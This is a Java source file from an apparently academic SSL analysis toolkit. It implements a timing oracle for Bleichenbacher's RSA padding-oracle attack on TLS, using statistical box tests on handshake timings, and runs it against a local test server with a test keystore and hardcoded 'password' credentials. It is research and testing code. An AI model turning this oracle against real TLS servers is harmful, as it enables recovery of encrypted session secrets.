/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.Bleichenbacher;
import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.analyzer.removeMe.SSLServer;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.SocketException;
import java.security.*;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Enumeration;
import java.util.logging.Level;
import javax.crypto.BadPaddingException;
import javax.crypto.Cipher;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;
import org.apache.log4j.Logger;
import org.apache.log4j.PropertyConfigurator;
import org.bouncycastle.jce.provider.BouncyCastleProvider;

/**
 *
 * @author Juraj Somorovsky - juraj.somorovsky@rub.de
 * @version 0.1
 */
public class TimingOracle extends ATimingOracle {

    /**
     * Log4j logger initialization.
     */
    private static Logger logger = Logger.getRootLogger();
    /**
     * Plain PKCS message
     */
    private static final byte[] plainPKCS = new byte[]{
        (byte) 0x00, (byte) 0x02, (byte) 0xf5, (byte) 0xa7, (byte) 0x9f,
        (byte) 0xcd, (byte) 0xb1, (byte) 0x27, (byte) 0xf9, (byte) 0x39,
        (byte) 0x15, (byte) 0x21, (byte) 0x49, (byte) 0x71, (byte) 0x65,
        (byte) 0x97, (byte) 0x33, (byte) 0x99, (byte) 0x6d, (byte) 0x9b,
        (byte) 0xcd, (byte) 0x6d, (byte) 0x4b, (byte) 0xe3, (byte) 0xf5,
        (byte) 0xfd, (byte) 0xb5, (byte) 0x71, (byte) 0xd5, (byte) 0x69,
        (byte) 0x71, (byte) 0x91, (byte) 0xb9, (byte) 0x39, (byte) 0xc9,
        (byte) 0x6d, (byte) 0xf5, (byte) 0x59, (byte) 0xf1, (byte) 0xb9,
        (byte) 0x97, (byte) 0xb7, (byte) 0x6b, (byte) 0xff, (byte) 0x33,
        (byte) 0xd1, (byte) 0x9b, (byte) 0x85, (byte) 0x13, (byte) 0xd5,
        (byte) 0x09, (byte) 0xb5, (byte) 0x33, (byte) 0xc9, (byte) 0x2d,
        (byte) 0xcf, (byte) 0xff, (byte) 0x53, (byte) 0xd7, (byte) 0xed,
        (byte) 0xd5, (byte) 0x1d, (byte) 0x45, (byte) 0x4d, (byte) 0xc9,
        (byte) 0xcb, (byte) 0x4b, (byte) 0x27, (byte) 0x21, (byte) 0x5f,
        (byte) 0x69, (byte) 0xf5, (byte) 0x67, (byte) 0x5d, (byte) 0xab,
        (byte) 0x9b, (byte) 0xf5, (byte) 0xc3, (byte) 0xc3, (byte) 0xaf,
        (byte) 0x7f, (byte) 0x6d, (byte) 0xa1, (byte) 0xe5, (byte) 0xfd,
        (byte) 0x3d, (byte) 0x93, (byte) 0xbb, (byte) 0x29, (byte) 0x11,
        (byte) 0x9b, (byte) 0x59, (byte) 0x5f, (byte) 0x11, (byte) 0x17,
        (byte) 0x17, (byte) 0xaf, (byte) 0x71, (byte) 0x33, (byte) 0xd7,
        (byte) 0x3f, (byte) 0x1b, (byte) 0x2f, (byte) 0x2b, (byte) 0xcd,
        (byte) 0x77, (byte) 0xfd, (byte) 0x3f, (byte) 0x5d, (byte) 0x67,
        (byte) 0x3b, (byte) 0x8f, (byte) 0xcd, (byte) 0xc5, (byte) 0x07,
        (byte) 0x6f, (byte) 0x59, (byte) 0x2b, (byte) 0xa7, (byte) 0x0d,
        (byte) 0xd3, (byte) 0x93, (byte) 0x87, (byte) 0x8d, (byte) 0x25,
        (byte) 0x47, (byte) 0x3b, (byte) 0xf7, (byte) 0x2d, (byte) 0xf9,
        (byte) 0x69, (byte) 0xdd, (byte) 0xe5, (byte) 0x85, (byte) 0x79,
        (byte) 0x7d, (byte) 0xc9, (byte) 0x09, (byte) 0xb7, (byte) 0xb7,
        (byte) 0x3d, (byte) 0x07, (byte) 0x23, (byte) 0x25, (byte) 0x07,
        (byte) 0x71, (byte) 0xb9, (byte) 0x1b, (byte) 0xcf, (byte) 0x15,
        (byte) 0x99, (byte) 0xdf, (byte) 0xb5, (byte) 0x6b, (byte) 0x29,
        (byte) 0x21, (byte) 0x4d, (byte) 0x4b, (byte) 0xf5, (byte) 0x31,
        (byte) 0x37, (byte) 0x9b, (byte) 0x43, (byte) 0x89, (byte) 0xd9,
        (byte) 0xef, (byte) 0x81, (byte) 0x55, (byte) 0x61, (byte) 0x4f,
        (byte) 0xc9, (byte) 0xff, (byte) 0xcf, (byte) 0x49, (byte) 0x73,
        (byte) 0xa9, (byte) 0x7f, (byte) 0xcb, (byte) 0xb5, (byte) 0x4f,
        (byte) 0x9d, (byte) 0xa5, (byte) 0xc9, (byte) 0x97, (byte) 0x3d,
        (byte) 0x9b, (byte) 0xf1, (byte) 0x9f, (byte) 0xf1, (byte) 0x95,
        (byte) 0xf9, (byte) 0x07, (byte) 0xa7, (byte) 0x95, (byte) 0xd5,
        (byte) 0xef, (byte) 0xd3, (byte) 0x4b, (byte) 0x27, (byte) 0x1f,
        (byte) 0x1f, (byte) 0x27, (byte) 0x9f, (byte) 0x5d, (byte) 0x8f,
        (byte) 0x39, (byte) 0x1b, (byte) 0x00, (byte) 0x03, (byte) 0x01,
        (byte) 0x06, (byte) 0x26, (byte) 0xa6, (byte) 0x40, (byte) 0x57,
        (byte) 0x4b, (byte) 0x50, (byte) 0xd6, (byte) 0xa3, (byte) 0xd0,
        (byte) 0x8a, (byte) 0x70, (byte) 0x16, (byte) 0x0a, (byte) 0x0d,
        (byte) 0xaf, (byte) 0x33, (byte) 0x2a, (byte) 0x7f, (byte) 0x9b,
        (byte) 0xc8, (byte) 0x65, (byte) 0xa7, (byte) 0xb5, (byte) 0x54,
        (byte) 0xe7, (byte) 0x48, (byte) 0x9f, (byte) 0x57, (byte) 0xda,
        (byte) 0xc9, (byte) 0xbf, (byte) 0x34, (byte) 0x8b, (byte) 0x8d,
        (byte) 0xd4, (byte) 0x84, (byte) 0xed, (byte) 0xc9, (byte) 0x63,
        (byte) 0x2b, (byte) 0x16, (byte) 0x6f, (byte) 0x2c, (byte) 0x38,
        (byte) 0x40};
    private Cipher cipher;
    private SSLServer sslServer;
    /**
     * Server key store.
     */
    private static final String PATH_TO_JKS = "server.jks";
    /**
     * Pass word for server key store.
     */
    private static final String JKS_PASSWORD = "password";
    /**
     * Test Server Thread.
     */
    private Thread sslServerThread;
    /**
     * Test host.
     */
    private static final String HOST = "localhost";
    /**
     * Test port.
     */
    private static final int PORT = 10443;
    /**
     * Detailed Info print out.
     */
    private static final boolean PRINT_INFO = true;
    /**
     * Protocol short name.
     */
    private String protocolShortName = "TLS";
    /**
     * Amount of training measurementsTest
     */
    private static final int trainingAmount = 200;
    /**
     * Amount of measurementsTest per Oracle query
     */
    private static final int measurementAmount = 50;
    private static final int measurementFactorForValidation = 3;
    /**
     * Amount of warmup measurementsTest
     */
    private static final int warmupAmount = 10;
    /**
     * Timing difference between invalid and valid timings
     */
    private static final long validInvalidBoundary = -20000;
    private int boxLowPercentile = 20,
            boxHighPercentile = 20;
    private int counterOracle = 0;
    private int counterRequest = 0;
    ArrayList<Long> validTimings = new ArrayList<Long>(trainingAmount);
    ArrayList<Long> invalidTimings = new ArrayList<Long>(trainingAmount);
    // TODO: just for debugging
    public byte[] encPMSWrong;
    public byte[] encPMS;

    /**
     * Constructor
     *
     * @param serverAddress
     * @param serverPort
     * @throws SocketException
     */
    public TimingOracle(final String serverAddress, final int serverPort,
            final PrivateKey privateKey, final OracleType oracleType)
            throws SocketException, NoSuchAlgorithmException,
            InvalidKeyException, NoSuchPaddingException {
        super(serverAddress, serverPort);
        Security.addProvider(new BouncyCastleProvider());

        this.oracleType = oracleType;
        cipher = Cipher.getInstance("RSA/None/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, privateKey);
    }

    private boolean isValidPMS(byte[] testPMS) {
        boolean result;

        counterRequest++;
        result = isValidPMS(testPMS, measurementAmount);

        if (result == true) {
            System.out.
                    println(
                    "Found a candidate for a valid key. Checking again with more measurements.");
            result = isValidPMS(testPMS,
                    measurementAmount * measurementFactorForValidation);
        }

        return result;
    }

    /**
     * This method performs the statistical analysis of the timing
     * measurementsTest. It assumes that a valid key has a significantly lower
     * response time than an invalid key. In a nutshell, the method performs
     * Crosby's box test.
     *
     * @param testKey An array containing the list of measurementsTest that were
     * performed with the key to be tested
     * @param validKey An array containing the list of measurementsTest that
     * were performed with a known-to-be-valid key
     * @return true if testKey is significantly different from invalidKey and
     * thus valid.
     */
    private boolean isValidPMS(byte[] testPMS, int amountOfMeasurements) {

        long[] measurementsTest = new long[amountOfMeasurements];
        long[] measurementsInvalid = new long[amountOfMeasurements];

        for (int i = 0; i < amountOfMeasurements; i++) {
            try {
                executeWorkflow(testPMS, ESupportedSockets.TimingSocket);
                measurementsTest[i] = getTimeDelay(getWorkflow().getTraceList());

                executeWorkflow(encPMSWrong, ESupportedSockets.TimingSocket);
                measurementsInvalid[i] = getTimeDelay(getWorkflow().
                        getTraceList());
            } catch (OracleException ex) {
                java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                        log(Level.SEVERE, null, ex);
            }
        }

        Arrays.sort(measurementsTest);
        Arrays.sort(measurementsInvalid);

        int posLow = measurementsTest.length * boxLowPercentile / 100;
        int posHigh = measurementsInvalid.length * boxHighPercentile / 100;

        /*
         * If the filtered difference between these two measurements is smaller
         * than the validInvalidBoundary, then the key is valid (--> true).
         */
        boolean result = (measurementsTest[posLow] - measurementsInvalid[posHigh]) < validInvalidBoundary;


        System.out.
                println(
                "ZZZ " + measurementsTest[posLow] + " - " + measurementsInvalid[posHigh] + " = " + (measurementsTest[posLow] - measurementsInvalid[posHigh]) + ", " + result);

        return result;
    }

    @Override
    public void trainOracle(byte[] validRequest, byte[] invalidRequest)
            throws OracleException {

        // warmup
        System.out.print("warmup... ");
        for (int i = 0; i < warmupAmount / 2; i++) {
            executeWorkflow(invalidRequest, ESupportedSockets.TimingSocket);
            executeWorkflow(validRequest, ESupportedSockets.TimingSocket);
        }
        System.out.println("done!");


//        try {
//            long delay;
//            // train the oracle using the executeWorkflow functionality
//            for (int i = 0; i < trainingAmount; i++) {
//                executeWorkflow(validRequest);
//                delay = getTimeDelay(getWorkflow().getTraceList());
//                validTimings.add(delay);
//
//                executeWorkflow(invalidRequest);
//                delay = getTimeDelay(getWorkflow().getTraceList());
//                invalidTimings.add(delay);
//
//                System.out.print("\r left requests for training " + (trainingAmount - i));
//            }
//            System.out.println("\n");
//            FileWriter fw = new FileWriter("training_data.csv");
//            for(int i = 0; i < trainingAmount; i++) {
//                fw.write(i + ";invalid;" + invalidTimings.get(i) + "\n");
//                fw.write((i + trainingAmount) + ";valid;" + validTimings.get(i) + "\n");
//            }
//            fw.close();
//            
//            long[] temp = new long[trainingAmount];
//            for(int i = 0; i < trainingAmount; i++) {
//                temp[i] = invalidTimings.get(i);
//            }
//            Arrays.sort(temp);
//            int pos = (trainingAmount * boxLowPercentile) / 100;
//            
//            invalidKeyLow = temp[pos];
//            
//            System.out.println("TRAINING: " + Arrays.toString(temp) + "; " + pos + "; " + invalidKeyLow);
//            
//            
//        } catch (IOException ex) {
//            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).log(Level.SEVERE, null, ex);
//        }

//        Conf.put("inputFile", "training_data.csv");
//        Conf.put("gnuplot", "/usr/bin/gnuplot");
//        Conf.put("makeindexPath", "/usr/bin/makeindex");
//        Conf.put("pdflatex", "/usr/bin/pdflatex");
//        ReaderCsv reader = new ReaderCsv();
//        Dataset dataset = new Dataset(reader);
//        dataset.setName("New Measurement");
//        String report = de.fau.pi1.timerReporter.main.Main.getReport();
//        
//        // create plot pool to multi threaded the plots
//        PlotPool plotPool = new PlotPool(report, dataset);
//
//        // plot the data set with the lower bound of 0.0 and the upper bound of 1.0
//        // plotPool.plot("Unfiltered Measurements", 0.0, 1.0);
//
//        // plot the data set with the user input lower bound and upper bound
//        // plotPool.plot("Filtered Measurments: User Input", new Double(0.2), new Double(0.3));
//
//        // build the evaluation phase
//        StatisticEvaluation statisticEvaluation = new StatisticEvaluation(dataset, plotPool);
//
//        /*
//         * this part shows how an optimal box is set by a user
//         */
//        /*double[] userInputOptimalBox = new double[2];
//         userInputOptimalBox[0] = new Double(0.19);
//         userInputOptimalBox[1] = new Double(0.21);
//         statisticEvaluation.setOptimalBox(userInputOptimalBox);*/
//
//        // Manually set the minimum amount of measurementsTest
//        // statisticEvaluation.onlyValidationPhase(1000);
//
//        // Automatically determine minimum amount of measurementsTest
//        statisticEvaluation.calibrationPhase();
//
//        // print the box test results into a csv file
//        statisticEvaluation.printBoxTestResults(new File(report + Folder.getFileSep() + FileId.getId() + "-" + "BoxTestResult.csv"));
//
//        /*
//         * this part shows the getter of the evaluation results
//         * 
//         for (BoxTestResults result : statisticEvaluation.getBoxTestResults()) {
//         System.out.println(result.getInputFile() + " [" + result.getSecretA().getName() + "<" + result.getSecretB().getName() + "]: " + result.getOptimalBox()[0] + "-" + result.getOptimalBox()[1]);
//
//         // iterate above all tested smallest sizes
//         for(int i = 0; i < result.getSmallestSize().size(); ++i) {
//         System.out.println("Minimum amouont of measurementsTest: " + result.getSmallestSize().get(i) + "\nConfidence Interval: " + result.getConfidenceInterval().get(i));
//         System.out.println("Subset A overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapA().get(i)));
//         System.out.println("Subset B overlaps: " + Folder.convertArrayListToString(result.getSubsetOverlapB().get(i)));
//         System.out.println("Subset A and B significant different: " + Folder.convertArrayListToString(result.getSignificantDifferent().get(i)));
//
//         }
//         }
//         */
//
//        // store the time lines
//        ArrayList<String> timelineNames = statisticEvaluation.storeTimelines(report + Folder.getFileSep() + "images" + Folder.getFileSep());
//
//        // close the thread pool
//        plotPool.close();
//
//        // write results in html and pdf
//        // new WriteHTML(dataset, report, plotPool).write();
//
//        try {
//            new WritePDF(dataset, report, plotPool, timelineNames).write();
//        } catch (Exception e) {
//            e.printStackTrace();
//            System.out.println("Error while writing the pdf.");
//        }
//
//        // delete the folder tmp
//        Folder.deleteTmp();
    }

    private void plausibilityCheck() {
        try {
            for (int i = 0; i < 100; i++) {
                if (i % 2 == 0) {
                    System.out.
                            println("TRUE  : Ground truth: " + cheat(encPMS) + ", timing: " + isValidPMS(
                            encPMS));
                } else {
                    System.out.
                            println(
                            "FALSE : Ground truth: " + cheat(encPMSWrong) + ", timing: " + isValidPMS(
                            encPMSWrong));
                }
            }
        } catch (IllegalBlockSizeException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        } catch (BadPaddingException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }
    }

    private static KeyStore loadKeyStore(final InputStream keyStoreStream,
            final String keyStorePassword) throws KeyStoreException, IOException,
            NoSuchAlgorithmException, CertificateException {
        KeyStore ks = KeyStore.getInstance("JKS");
        ks.load(keyStoreStream, keyStorePassword.toCharArray());
        
        return ks;
    }

    private static byte[] encryptHelper(final byte[] msg,
            final PublicKey publicKey) {
        byte[] result = null;
        try {
            Cipher cipher = Cipher.getInstance("RSA/None/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);
            byte[] tmp = cipher.doFinal(msg);
            // deep copy
            result = new byte[tmp.length];
            System.arraycopy(tmp, 0, result, 0, result.length);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IllegalBlockSizeException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (BadPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        }

        return result;
    }

    private boolean cheat(final byte[] msg) throws IllegalBlockSizeException,
            BadPaddingException {
        boolean result;

        byte[] plainMessage = cipher.doFinal(msg);;

        StdPlainOracle plainOracle = new StdPlainOracle(publicKey,
                oracleType, cipher.getBlockSize());
        result = plainOracle.checkDecryptedBytes(plainMessage);

        return result;
    }

    @Override
    public boolean checkPKCSConformity(byte[] encPMS) throws OracleException {
        boolean ret = false;
        boolean groundTruth = false;

        try {
            groundTruth = cheat(encPMS);
            boolean test = isValidPMS(encPMS);

            if (groundTruth == false) {
                if (test == false) {
                    /*
                     * all good!
                     */
                    ret = test;
                } else {
                    /*
                     * The submitted key was invalid but our test predicted that the
                     * key was valid. This is the worst case, because it will most
                     * certainly break the subsequent computations. We will stop here.
                     */
                    System.err.
                            println(
                            "ERROR: invalid key was predicted to be valid. Stopping.");
                    java.util.logging.Logger.getLogger(TimingOracle.class.
                            getName()).log(Level.SEVERE,
                            "ERROR: invalid key was predicted to be valid. Stopping.");
                    System.exit(1);
                }

            } else {
                if (test == false) {
                    /*
                     * The submitted key was valid but our test predicted that the
                     * key was invalid. This decreases the performance of the attack
                     * but does not necessarily break subsequent computations.
                     */
                    System.err.println("ERROR: valid key was predicted to be "
                            + "invalid. This decreases the attack performance.");
                    java.util.logging.Logger.getLogger(TimingOracle.class.
                            getName()).log(Level.WARNING,
                            "ERROR: valid key was predicted to be invalid. This decreases the attack performance.");
                    ret = test;
                } else {
                    /*
                     * all good!
                     */
                    ret = test;
                }
            }

        } catch (IllegalBlockSizeException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        } catch (BadPaddingException ex) {
            java.util.logging.Logger.getLogger(TimingOracle.class.getName()).
                    log(Level.SEVERE, null, ex);
        }

        System.out.println(counterOracle++ + ": Ground truth: " 
                + groundTruth + ", timingoracle: " + ret);

        return ret;
    }

    public void setUp() {
        try {
            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
                    "password");
            System.setProperty("javax.net.debug", "ssl");
            
            sslServer = new SSLServer(ks, JKS_PASSWORD,
                    protocolShortName, PORT, PRINT_INFO);
            sslServerThread = new Thread(sslServer);
            sslServerThread.start();
            Thread.currentThread().sleep(2000);
        } catch (Exception e) {                        
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        PropertyConfigurator.configure("logging.properties");

        try {
            String keyName = "2048_rsa";
            String keyPassword = "password";

            KeyStore ks = loadKeyStore(new FileInputStream("2048.jks"),
                    "password");
            PublicKey publicKey = ks.getCertificate(keyName).getPublicKey();
            PrivateKey privateKey = (PrivateKey) ks.getKey(keyName, keyPassword.
                    toCharArray());

            TimingOracle to = new TimingOracle(HOST ,PORT,
                    privateKey, OracleType.TTT);
            // TODO: Start SSL-Server for testing purposes
            to.setUp();

            // a PMS is exactly 48 bytes long!
            byte[] rawPMS = new byte[48];            
            System.arraycopy(plainPKCS, plainPKCS.length - 48, rawPMS, 0,
                    rawPMS.length);
            // it is necessary to set the plain PMS for a complete handshake
            to.setPlainPMS(new PreMasterSecret(rawPMS));    

            byte[] plainPKCS_wrong = new byte[plainPKCS.length];
            System.arraycopy(plainPKCS, 0, plainPKCS_wrong, 0, plainPKCS.length);
            plainPKCS_wrong[0] = 23;
            
            to.encPMS = encryptHelper(plainPKCS, publicKey);
            to.encPMSWrong = encryptHelper(plainPKCS_wrong, publicKey);

            to.trainOracle(to.encPMS, to.encPMSWrong);
            to.plausibilityCheck();

            Bleichenbacher attacker = new Bleichenbacher(to.encPMS, to, true);
            attacker.attack();
        } catch (InvalidKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchPaddingException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (UnrecoverableKeyException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (KeyStoreException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (NoSuchAlgorithmException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (CertificateException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (IOException ex) {
            logger.error(ex.getMessage(), ex);
        } catch (OracleException ex) {
            logger.error(ex.getMessage(), ex);
        }
    }
}